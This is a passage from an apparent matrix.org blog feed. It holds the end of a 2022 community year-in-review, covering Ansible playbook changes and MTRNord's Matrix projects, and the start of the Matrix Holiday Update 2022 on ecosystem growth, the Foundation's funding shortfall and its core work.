&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#go-skype-bridge-bridging-support&quot;&gt;go-skype-bridge&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#matrix-appservice-kakaotalk-support&quot;&gt;matrix-appservice-kakaotalk&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Support for the following new &lt;strong&gt;bots&lt;&#x2F;strong&gt; was added:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#buscarron-bot-support&quot;&gt;buscarron bot&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#honoroit-bot-support&quot;&gt;Honoroit bot&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#matrix-registration-bot-support&quot;&gt;matrix-registration-bot&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#matrix-hookshot-bridging-support&quot;&gt;matrix-hookshot&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#maubot-support&quot;&gt;maubot&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Support for the following new &lt;strong&gt;components and services&lt;&#x2F;strong&gt; was added:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#borg-backup-support&quot;&gt;Borg backup&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#cactus-comments-support&quot;&gt;Cactus Comments&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#cinny-support&quot;&gt;Cinny&lt;&#x2F;a&gt; client support&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#ntfy-push-notifications-support&quot;&gt;ntfy&lt;&#x2F;a&gt; notifications&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#matrix-ldap-registration-proxy-support&quot;&gt;matrix-ldap-registration-proxy&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#matrix_encryption_disabler-support&quot;&gt;matrix_encryption_disabler support&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#synapse-s3-storage-provider-support&quot;&gt;synapse-s3-storage-provider&lt;&#x2F;a&gt; to stop the Synapse media store from being a scalability problem. This brought along &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#synapse-container-image-customization-support&quot;&gt;another feature&lt;&#x2F;a&gt; - an easier way to customize the Synapse container image without having to fork and self-build all of it from scratch&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Besides these major user-visible changes, a lot of work also happened &lt;strong&gt;under the hood&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;we made &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#potential-backward-compatibility-break-major-improvements-to-synapse-workers&quot;&gt;major improvements to Synapse workers&lt;&#x2F;a&gt; - adding support for stream writers and for running multiple workers of various kinds (federation senders, pushers, background task processing workers, etc.)&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;we &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#backward-compatibility-break-changing-how-reverse-proxying-to-synapse-works---now-via-a-matrix-synapse-reverse-proxy-companion-service&quot;&gt;improved the compatibility of (Synapse + workers) with the rest of the playbook&lt;&#x2F;a&gt; by introducing a new &lt;code&gt;matrix-synapse-reverse-proxy-companion-service&lt;&#x2F;code&gt; service&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;we started &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#the-playbook-now-uses-external-roles-for-some-things&quot;&gt;splitting various Ansible roles out of the Matrix playbook and into independent roles&lt;&#x2F;a&gt; (e.g. &lt;code&gt;matrix-postgres&lt;&#x2F;code&gt; -&amp;gt; &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;devture&#x2F;com.devture.ansible.role.postgres&quot;&gt;com.devture.ansible.role.postgres&lt;&#x2F;a&gt;), which could be included in other Ansible playbooks. In fact, these roles already power a few &lt;strong&gt;interesting other sibling playbooks&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;gitea-docker-ansible-deploy&quot;&gt;gitea-docker-ansible-deploy&lt;&#x2F;a&gt;, for deploying a &lt;a href=&quot;https:&#x2F;&#x2F;gitea.io&#x2F;&quot;&gt;Gitea&lt;&#x2F;a&gt; (self-hosted &lt;a href=&quot;https:&#x2F;&#x2F;git-scm.com&#x2F;&quot;&gt;Git&lt;&#x2F;a&gt; service) server&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;nextcloud-docker-ansible-deploy&quot;&gt;nextcloud-docker-ansible-deploy&lt;&#x2F;a&gt;, for deploying a &lt;a href=&quot;https:&#x2F;&#x2F;nextcloud.com&#x2F;&quot;&gt;Nextcloud&lt;&#x2F;a&gt; groupware server&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;vaultwarden-docker-ansible-deploy&quot;&gt;vaultwarden-docker-ansible-deploy&lt;&#x2F;a&gt;, for deploying a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;dani-garcia&#x2F;vaultwarden&quot;&gt;Vaultwarden&lt;&#x2F;a&gt; password manager server (unofficial &lt;a href=&quot;https:&#x2F;&#x2F;bitwarden.com&#x2F;&quot;&gt;Bitwarden&lt;&#x2F;a&gt; compatible server)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;These sibling playbooks co-exist nicely with one another due to using &lt;a href=&quot;https:&#x2F;&#x2F;traefik.io&#x2F;&quot;&gt;Traefik&lt;&#x2F;a&gt; for reverse-proxying, instead of trying to overtake the whole server by running their own &lt;a href=&quot;https:&#x2F;&#x2F;nginx.org&#x2F;&quot;&gt;nginx&lt;&#x2F;a&gt; reverse-proxy. Hopefully soon, the Matrix playbook will follow suit and be powered by Traefik by default.&lt;&#x2F;p&gt;
&lt;p&gt;Last, but not least, to optimize our &lt;a href=&quot;https:&#x2F;&#x2F;etke.cc&#x2F;&quot;&gt;etke.cc managed Matrix server hosting service&lt;&#x2F;a&gt;&#x27;s performance (but also individual Ansible playbook runs for people self-hosting by themselves using the playbook), we&#x27;ve &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&#x2F;blob&#x2F;master&#x2F;CHANGELOG.md#2x-5x-performance-improvements-in-playbook-runtime&quot;&gt;improved playbook runtime 2-5x&lt;&#x2F;a&gt; by employing various Ansible tricks.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;MTRNord&#x27;s Journey of Matrix 2022&lt;&#x2F;h2&gt;
&lt;p&gt;MTRNord is known for starting way too many interesting projects. Definitely worth checking out!&lt;&#x2F;p&gt;
&lt;p&gt;MTRNord tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Since I worked on so many projects this year, I am trying to group these here.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-art&#x2F;pull&#x2F;121&quot;&gt;Matrix-Art&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Matrix Art was meant to be a Deviantart or Art Station style image gallery using Matrix. This project, as many others of mine, is currently on ice.&lt;&#x2F;p&gt;
&lt;p&gt;It offered profiles, uploading images and comments using Spaces as FS.&lt;&#x2F;p&gt;
&lt;p&gt;You can see the latest version of it at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-art&#x2F;pull&#x2F;121&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-art&#x2F;pull&#x2F;121&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-moderation-widget&quot;&gt;Matrix Moderation Widget for Mjolnir&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;A widget made to be a companion to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;mjolnir&quot;&gt;Mjolnir&lt;&#x2F;a&gt;. It offers a form input and lists to view the policy lists.&lt;&#x2F;p&gt;
&lt;p&gt;For 2023 this effort is going into the Moderation bot I am currently developing as part of the Matrix Spam ML project. While not being a widget, similar UX decisions are used.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-fuzz&quot;&gt;Matrix Fuzz&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;A simple fuzzer written in rust to fuzz some endpoints of Synapse.&lt;br&#x2F;&gt;A Fuzzer is essentially a bruteforce approach to finding bugs. Usually by sending pseudo random characters.&lt;&#x2F;p&gt;
&lt;p&gt;As part of running this, I found a few minor verification issues at Synapse:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;13510&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;13511&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;13512&lt;&#x2F;li&gt;
&lt;li&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;13664&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;For 2023 the goal is to fuzz more endpoints, especially within the rooms using fuzzed events.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;mrsbfh&quot;&gt;MRSBFH - Matrix-Rust-SDK-Bot-Framework-Helper&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;In 2022, I also worked on further updating &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;mrsbfh&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;mrsbfh&lt;&#x2F;a&gt; which is a command bot framework for the matrix-rust-sdk.&lt;&#x2F;p&gt;
&lt;p&gt;Since then, the SDK massively improved how you interact with the API. Due to this, there are no plans to further develop it as by now the SDK has a sufficient API interface.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;generic-conference-bot&#x2F;tree&#x2F;MTRNord&#x2F;Pretalx&quot;&gt;Generic Conference Bot&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;People likely know the Conference bot from FOSDEM. Back in February, I did work on making it possible to be used more generic without the hard-coded penta integration.&lt;&#x2F;p&gt;
&lt;p&gt;As a result, this branch was created: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;generic-conference-bot&#x2F;tree&#x2F;MTRNord&#x2F;Pretalx&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;generic-conference-bot&#x2F;tree&#x2F;MTRNord&#x2F;Pretalx&lt;&#x2F;a&gt; It offers a way to easily add new backends and adds a pretalx backend. Due to the changes it has, there is currently no way this is possible to upstream, but maybe it will help someone from the community.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-spam-ml&quot;&gt;Matrix Spam ML&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;This project is mainly a project to experiment with using Machine Learning for Moderation as a warning system.&lt;&#x2F;p&gt;
&lt;p&gt;As part of this effort, there is currently an RNN model and a BERT model available. The trainingset is public.&lt;&#x2F;p&gt;
&lt;p&gt;For users, there is both an API endpoint for this available and a Matrix Mod Bot in progress.&lt;&#x2F;p&gt;
&lt;p&gt;You can find more about it at https:&#x2F;&#x2F;github.com&#x2F;MTRNord&#x2F;matrix-spam-ml or join the chat at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-spam-ml:midnightthoughts.space&quot;&gt;#matrix-spam-ml:midnightthoughts.space&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.nordgedanken.dev&#x2F;MTRNord&#x2F;matrix-faq-rasa&quot;&gt;Matrix Faq Rasa&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;This is a RasaX based FAQ Bot project. The goal is to have a NLP based FAQ bot. It currently is very simple and not finished. The goal for 2023 is to continue working on this and getting it to a stable level where people can contribute to.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.turbo.fish&quot;&gt;Matrix.org Zola&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Last but not least, I did kick off the Zola rewrite of Matrix.org together with Thib and jplatte, and a small team of element devs and designers. Please note that this was initiated by the community and still is a community project.&lt;&#x2F;p&gt;
&lt;p&gt;The goal of this rewrite is to move away from Gatsby and rewrite and redesign matrix.org using the zola static page generator.&lt;br&#x2F;&gt;We made great progress this year, but sadly it will take a bit longer before it can be deployed. :) If you want to watch progress, I suggest looking at things labeled with &amp;quot;zola&amp;quot; in &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;miki.community&quot;&gt;Miki - A Matrix Wiki&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Miki is a MediaWiki meant for Matrix. It isn&#x27;t a bridge, but instead the goal is to document projects and history around Matrix. This project aims for 2023 to extend the data, while in 2022 the work was focused around infrastructure.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;That&#x27;s all I know about so far. I hope you had a great year and that the next one will be even better. As you can see, the Matrix community is a riot of colors and seems to grow every year. I absolutely love it!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Holiday Update 2022</title>
        <published>2022-12-25T00:00:00+00:00</published>
        <updated>2022-12-25T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2022/12/25/the-matrix-holiday-update-2022/" type="text/html"/>
        <id>https://matrix.org/blog/2022/12/25/the-matrix-holiday-update-2022/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;2022 has been a rollercoaster of a year for Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;On one hand, the network has doubled in size (44.1M to 80.3M visible matrix IDs). The wider world is having a grand awakening to the importance of decentralisation thanks to the situation at Twitter. We’ve seen an amazing number of major new players entering the Matrix ecosystem: &lt;a href=&quot;https:&#x2F;&#x2F;macaw.social&#x2F;@wongmjane&#x2F;109529583352532543&quot;&gt;Reddit appears to be building out new Chat&lt;&#x2F;a&gt; functionality using Matrix; &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;teamspeak&#x2F;status&#x2F;1589621116032585728&quot;&gt;TeamSpeak announced&lt;&#x2F;a&gt; Matrix-based chat in TS5; &lt;a href=&quot;https:&#x2F;&#x2F;meta.discourse.org&#x2F;t&#x2F;matrix-protocol-for-chat&#x2F;210780&quot;&gt;Discourse&lt;&#x2F;a&gt; is working on adding Matrix support; &lt;a href=&quot;https:&#x2F;&#x2F;www.theregister.com&#x2F;2022&#x2F;06&#x2F;30&#x2F;thunderbird_102&quot;&gt;Thunderbird&lt;&#x2F;a&gt; launched Matrix support; Governments from &lt;a href=&quot;https:&#x2F;&#x2F;gouvernement.lu&#x2F;en&#x2F;actualites&#x2F;toutes_actualites&#x2F;communiques&#x2F;2022&#x2F;11-novembre&#x2F;16-hansen-lancement.html&quot;&gt;Luxembourg&lt;&#x2F;a&gt; to &lt;a href=&quot;https:&#x2F;&#x2F;delta.mil.gov.ua&#x2F;wiki&#x2F;info&#x2F;&quot;&gt;Ukraine&lt;&#x2F;a&gt; have launched their own Matrix-powered chat infrastructure; and hundreds of other organisations ranging from startups to massive private &amp;amp; public sector entities are betting on the protocol. The European Parliament has used Matrix as a proof-point for the viability for communication interoperability between gatekeepers in the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;03&#x2F;29&#x2F;how-do-you-implement-interoperability-in-a-dma-world&quot;&gt;Digital Markets Act&lt;&#x2F;a&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;02&#x2F;07&#x2F;hosting-fosdem-2022-on-matrix&quot;&gt;FOSDEM 2022&lt;&#x2F;a&gt; ran smoothly via Matrix with over 23,000 attendees, making it the world&#x27;s largest open source conference (with 70% of attendees using their own servers!). &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;dsam-och-esam-forordar-matrix-for-saker-och-federerad-kommunikation-inom-sveriges-offentliga-sektor&#x2F;&quot;&gt;Sweden&lt;&#x2F;a&gt; has published case studies on the benefits of Matrix for messaging interoperability. Meanwhile existing players like Germany’s BWI have expanded their scope to providing Matrix messaging to the &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;blog&#x2F;bundesmessenger-is-a-milestone-in-germanys-ground-breaking-vision&#x2F;&quot;&gt;whole German State&lt;&#x2F;a&gt;; Automattic is busy building &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Automattic&#x2F;chatrix&quot;&gt;Matrix plugins&lt;&#x2F;a&gt; for Wordpress; Rocket.Chat launched &lt;a href=&quot;https:&#x2F;&#x2F;rocket.chat&#x2F;press-releases&#x2F;rocket-chat-leverages-matrix-protocol-for-decentralized-and-interoperable-communications&quot;&gt;federation via Matrix&lt;&#x2F;a&gt;, Gematik has been busy progressing their &lt;a href=&quot;https:&#x2F;&#x2F;www.gematik.de&#x2F;anwendungen&#x2F;ti-messenger&quot;&gt;TI Messenger&lt;&#x2F;a&gt; initiative for interoperable messaging within Germany’s healthcare industry, and &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;case-studies&#x2F;tchap&quot;&gt;Tchap&lt;&#x2F;a&gt; in France is continuing to expand.&lt;&#x2F;p&gt;
&lt;p&gt;On the other hand, only a handful of these initiatives have resulted in funding reaching the core Matrix team. &lt;strong&gt;This is directly putting core Matrix development at risk.&lt;&#x2F;strong&gt; We are witnessing a classic tragedy of the commons. We’ve released all the foundational code of Matrix as permissively-licensed open source and got it to the point that anyone can successfully run it at scale themselves. The network is expanding exponentially. But in return, it transpires that the vast majority of these commercial deployments fail to contribute financially to the Matrix Foundation - whether by donating directly or supporting indirectly by working with &lt;a href=&quot;https:&#x2F;&#x2F;element.io&quot;&gt;Element&lt;&#x2F;a&gt;, who fund the vast majority of core Matrix development today.&lt;&#x2F;p&gt;
&lt;p&gt;In short: folks love the amazing decentralised encrypted comms utopia of Matrix.  But organisations also love that they can use it without having to pay anyone to develop or maintain it. &lt;strong&gt;This is completely unsustainable&lt;&#x2F;strong&gt;, and Element is now &lt;em&gt;literally&lt;&#x2F;em&gt; unable to fund the entirety of the Matrix Foundation on behalf of everyone else - and has had to lay off some of the folks working on the core team as a result.&lt;&#x2F;p&gt;
&lt;p&gt;The only viable solution to this is for organisations building on Matrix to contribute to sharing the costs of maintaining Matrix’s core projects.  We made &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;12&#x2F;01&#x2F;funding-matrix-via-the-matrix-org-foundation&quot;&gt;a proposal&lt;&#x2F;a&gt; to address this a few weeks ago, which we’ll iterate on further in the new year to find an approach which both empowers the community and encourages organisations to participate.  In the interim, if you are an organisation who’s building on Matrix and you want the project to continue to flourish, &lt;strong&gt;please&lt;&#x2F;strong&gt; mail &lt;a href=&quot;mailto:funding@matrix.org&quot;&gt;funding@matrix.org&lt;&#x2F;a&gt; to discuss how you can support the foundations that you are depending on.&lt;&#x2F;p&gt;
&lt;p&gt;As a reminder, the work the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;foundation&quot;&gt;Foundation&lt;&#x2F;a&gt; does today for the benefit of the Matrix includes:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Publishing the&lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&quot;&gt; Matrix Specification&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Organising the Matrix Spec Core Team, responsible for reviewing and evolving the protocol.&lt;&#x2F;li&gt;
&lt;li&gt;Writing roughly half the Matrix Spec Change &lt;a href=&quot;https:&#x2F;&#x2F;spec.matrix.org&#x2F;proposals&quot;&gt;proposals&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Developing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;Synapse&lt;&#x2F;a&gt;, the Python matrix homeserver implementation&lt;&#x2F;li&gt;
&lt;li&gt;Developing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendrite&quot;&gt;Dendrite&lt;&#x2F;a&gt;, the Go homeserver implementation&lt;&#x2F;li&gt;
&lt;li&gt;Developing client SDKs for Web (matrix-js-sdk, matrix-react-sdk), iOS (matrix-ios-sdk), Android (matrix-android-sdk2), Python (matrix-nio)&lt;&#x2F;li&gt;
&lt;li&gt;Developing our next-generation client SDKs (matrix-rust-sdk)&lt;&#x2F;li&gt;
&lt;li&gt;Developing our end-to-end encryption implementations (&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;libolm&lt;&#x2F;a&gt; in C&#x2F;C++ and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;vodozemac&quot;&gt;vodozemac&lt;&#x2F;a&gt; in Rust)&lt;&#x2F;li&gt;
&lt;li&gt;Developing next-generation end-to-end encryption implementations (&lt;a href=&quot;https:&#x2F;&#x2F;arewemlsyet.com&quot;&gt;MLS&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing and evolving additional core functionality in Matrix, including:
&lt;ul&gt;
&lt;li&gt;Account portability&lt;&#x2F;li&gt;
&lt;li&gt;Faster room joins over federation&lt;&#x2F;li&gt;
&lt;li&gt;Sliding Sync for instant client sync&lt;&#x2F;li&gt;
&lt;li&gt;Threads&lt;&#x2F;li&gt;
&lt;li&gt;Rich Text composer components&lt;&#x2F;li&gt;
&lt;li&gt;Spaces&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Developing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-hookshot&quot;&gt;open source integrations&lt;&#x2F;a&gt; to other products (GitLab, GitHub, JIRA... )&lt;&#x2F;li&gt;
&lt;li&gt;Developing open source bridges to other platforms (IRC, XMPP, Slack, Discord, Telegram, bifrost…)&lt;&#x2F;li&gt;
&lt;li&gt;Developing &lt;a href=&quot;https:&#x2F;&#x2F;arewep2pyet.com&quot;&gt;peer-to-peer Matrix&lt;&#x2F;a&gt; implementations, avoiding the need for servers (and associated data&#x2F;metadata accumulation) entirely&lt;&#x2F;li&gt;
&lt;li&gt;Developing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;lb&quot;&gt;low-bandwidth Matrix&lt;&#x2F;a&gt; transports&lt;&#x2F;li&gt;
&lt;li&gt;Developing and hosting static Matrix room archives for the wider network (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-static&quot;&gt;matrix-static&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-public-archive&quot;&gt;matrix-public-archive&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing and hosting the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&quot;&gt;matrix.to&lt;&#x2F;a&gt; link redirect service&lt;&#x2F;li&gt;
&lt;li&gt;Developing open source authentication mechanisms and integrations for Matrix (&lt;a href=&quot;https:&#x2F;&#x2F;areweoidcyet.com&quot;&gt;OIDC&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing decentralised Video&#x2F;VoIP conferencing servers on Matrix (&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2022&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-update-2022&#x2F;github.com&#x2F;matrix-org&#x2F;waterfall&quot;&gt;waterfall&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing decentralised Video&#x2F;VoIP client components on Matrix (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;pull&#x2F;2553&quot;&gt;matrixRTC&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Developing showcase &amp;quot;beyond chat&amp;quot; implementations of Matrix such as &lt;a href=&quot;https:&#x2F;&#x2F;thirdroom.io&quot;&gt;Third Room&lt;&#x2F;a&gt; &lt;&#x2F;li&gt;
&lt;li&gt;Developing moderation tooling and applying it to matrix.org (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;mjolnir&quot;&gt;mjolnir&lt;&#x2F;a&gt; and much more)&lt;&#x2F;li&gt;
&lt;li&gt;Publishing moderation reputation lists for the benefit of the wider community&lt;&#x2F;li&gt;
